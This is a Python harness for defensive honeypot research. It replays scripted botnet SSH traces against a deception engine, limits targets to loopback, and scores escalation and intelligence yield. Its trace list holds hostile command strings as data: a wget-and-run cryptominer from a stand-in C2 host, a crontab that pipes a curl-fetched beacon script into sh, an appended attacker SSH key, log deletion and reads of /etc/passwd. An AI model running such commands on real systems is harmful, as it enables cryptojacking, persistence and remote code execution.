"""
Botnet Trace Replay Harness.
Pre-registered in SPEC.md Section 5.4, EVAL.md Section 5.5, and SAFETY.md.

Replays realistic botnet attack traces and command sequences against the honeypot
decision engine and adaptive sensor in an isolated lab environment.
Enforces strict allowlist validation per SAFETY.md: non-loopback targets are blocked.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from analysis.cost_model import classify_attack_techniques, compute_session_yield, compute_session_cost
from harness.detector_runner import is_target_allowlisted, SafetyViolationError
from sensor.adaptive_server import AdaptiveSessionAdapter, PersonaManager

logger = logging.getLogger("harness.replay")


@dataclass
class AttackTrace:
    """Represents a scripted or recorded attacker session trace."""
    name: str
    visitor_ip: str = "198.51.100.99"
    client_version: str = "SSH-2.0-libssh_0.9.0"
    hassh: str = "b845df0e"
    auth_success: bool = True
    failed_logins: int = 1
    has_pty: bool = False
    commands: List[str] = field(default_factory=list)
    files: int = 0
    pivots: int = 0
    duration: float = 30.0


# Pre-registered standard attack traces representing common wild botnet profiles
STANDARD_TRACES: List[AttackTrace] = [
    AttackTrace(
        name="mass_scanner_probe",
        visitor_ip="198.51.100.11",
        client_version="SSH-2.0-libssh_0.8.0",
        auth_success=False,
        failed_logins=1,
        commands=[],
        duration=2.0,
    ),
    AttackTrace(
        name="reconnaissance_bot",
        visitor_ip="198.51.100.12",
        auth_success=True,
        failed_logins=3,
        has_pty=True,
        commands=["uname -a", "cat /proc/cpuinfo", "id", "whoami", "ls -la /tmp"],
        duration=20.0,
    ),
    AttackTrace(
        name="cryptominer_dropper",
        visitor_ip="198.51.100.13",
        auth_success=True,
        failed_logins=2,
        has_pty=True,
        commands=[
            "uname -a",
            "wget http://c2.pool.miner/xmrig -O /tmp/x; chmod +x /tmp/x",
            "/tmp/x --donate-level 1 -o stratum+tcp://xmr.pool:3333 &",
            "rm -rf /tmp/x.log",
        ],
        files=1,
        duration=120.0,
    ),
    AttackTrace(
        name="persistence_installer",
        visitor_ip="198.51.100.14",
        auth_success=True,
        failed_logins=4,
        has_pty=True,
        commands=[
            "echo 'ssh-rsa AAAA... attacker@c2' >> ~/.ssh/authorized_keys",
            "crontab -l; echo '* * * * * curl http://c2/beacon.sh | sh' | crontab -",
            "netstat -tuln",
        ],
        duration=60.0,
    ),
]


class BotnetReplayEngine:
    """Executes attack traces against the Honeypot Decision Engine & Adaptive Sensor."""

    def __init__(
        self,
        target_host: str = "127.0.0.1",
        target_port: int = 2222,
        decision_engine: Any = None,
        persona_manager: Optional[PersonaManager] = None,
        allow_rfc1918: bool = False,
    ) -> None:
        self.target_host = target_host
        self.target_port = target_port
        self.decision_engine = decision_engine
        self.persona_manager = persona_manager
        self.allow_rfc1918 = allow_rfc1918

        self._enforce_safety()

    def _enforce_safety(self) -> None:
        """Mandatory SAFETY.md check: Only loopback/lab targets allowed."""
        if not is_target_allowlisted(self.target_host, allow_rfc1918=self.allow_rfc1918):
            raise SafetyViolationError(
                f"External network target forbidden by SAFETY.md: {self.target_host}. "
                "Botnet replay harness must strictly target allowlisted lab targets (127.0.0.1 / localhost)."
            )

    def run_trace(self, trace: AttackTrace) -> Dict[str, Any]:
        """
        Executes a single attack trace through all stages (S1 to S5),
        verifying persona escalation, stage triage, and intelligence yield.
        """
        adapter = AdaptiveSessionAdapter(
            visitor_ip=trace.visitor_ip,
            session_id=f"replay_{trace.name}",
            decision_engine=self.decision_engine,
            persona_manager=self.persona_manager,
        )

        starting_tier = adapter.current_tier

        # Stage S1: Key Exchange
        adapter.on_kex_completed(client_version=trace.client_version, hassh=trace.hassh)

        # Stage S2: Authentication
        adapter.on_auth_completed(
            success=trace.auth_success,
            failed_count=trace.failed_logins,
            username="root",
        )

        # Stage S3, S4, S5: Commands Execution
        for cmd in trace.commands:
            adapter.on_command_received(cmd)

        final_tier = adapter.current_tier
        escalated = final_tier != starting_tier

        # Calculate Intelligence Yield & Cost
        ttps = classify_attack_techniques(trace.commands)
        yield_score = compute_session_yield(
            d_commands=len(set(trace.commands)),
            f_files=trace.files,
            p_pivots=trace.pivots,
            k_ttps=len(ttps),
        )
        cost = compute_session_cost(final_tier, duration_seconds=trace.duration)

        return {
            "trace_name": trace.name,
            "starting_tier": starting_tier,
            "final_tier": final_tier,
            "escalated": escalated,
            "commands_sent": len(trace.commands),
            "ttps": list(ttps),
            "yield": round(yield_score, 4),
            "cost": round(cost, 6),
            "yield_per_rupee": round(yield_score / cost, 4) if cost > 0 else 0.0,
        }

    def run_suite(self, traces: List[AttackTrace]) -> Dict[str, Any]:
        """Executes an arbitrary list of attack traces."""
        results = [self.run_trace(t) for t in traces]

        total_yield = sum(r["yield"] for r in results)
        total_cost = sum(r["cost"] for r in results)
        escalated_count = sum(1 for r in results if r["escalated"])
        n_traces = len(results)

        tier_counts = {"T1": 0, "T2": 0, "T3": 0}
        for r in results:
            tier_counts[r["final_tier"]] = tier_counts.get(r["final_tier"], 0) + 1

        return {
            "traces_evaluated": n_traces,
            "overall_yield": round(total_yield, 4),
            "overall_cost": round(total_cost, 6),
            "yield_per_rupee": round(total_yield / total_cost, 4) if total_cost > 0 else 0.0,
            "escalation_rate": round(escalated_count / n_traces, 4) if n_traces > 0 else 0.0,
            "tier_counts": tier_counts,
            "trace_results": results,
        }

    def run_standard_suite(self) -> Dict[str, Any]:
        """Executes the pre-registered standard suite of botnet traces."""
        return self.run_suite(STANDARD_TRACES)

    @staticmethod
    def load_synthetic_traces_from_counters(records: List[Dict[str, Any]], limit: int = 50) -> List[AttackTrace]:
        """
        Constructs SYNTHETIC AttackTraces derived from aggregate counters (EVAL.md Section 5.5).
        
        CRITICAL SCIENTIFIC CAVEAT:
        'session_aggregation.jsonl.gz' contains only integer counters (no command strings).
        The command sequences here are synthetic archetype templates scaled to cnt_command_input,
        NOT real captured attacker command text. Real captured text requires event-level data_all.
        """
        traces = []
        for i, r in enumerate(records[:limit]):
            cmd_count = int(r.get("cnt_command_input", 0) or 0)
            sample_cmds = ["uname -a", "id"] if cmd_count > 0 else []
            if cmd_count > 2:
                sample_cmds.extend(["cat /etc/passwd", "ps aux", "netstat -tuln"])
            traces.append(
                AttackTrace(
                    name=f"synthetic_trace_from_counter_{i+1}",
                    visitor_ip=str(r.get("src_ip", f"198.51.100.{100 + i}")),
                    client_version="SSH-2.0-OpenSSH_8.9",
                    hassh=str(r.get("hassh", "b845df0e")),
                    auth_success=bool(int(r.get("cnt_login_success", 0) or 0) > 0),
                    failed_logins=int(r.get("cnt_login_failed", 0) or 0),
                    has_pty=bool(r.get("has_pty", False)),
                    commands=sample_cmds,
                    files=int(r.get("cnt_file_download", 0) or 0) + int(r.get("cnt_file_upload", 0) or 0),
                    pivots=int(r.get("cnt_direct_tcpip_request", 0) or 0),
                    duration=float(r.get("duration", 15.0) or 15.0),
                )
            )
        return traces

    # Backwards-compatibility alias with clear caveat
    load_traces_from_records = load_synthetic_traces_from_counters
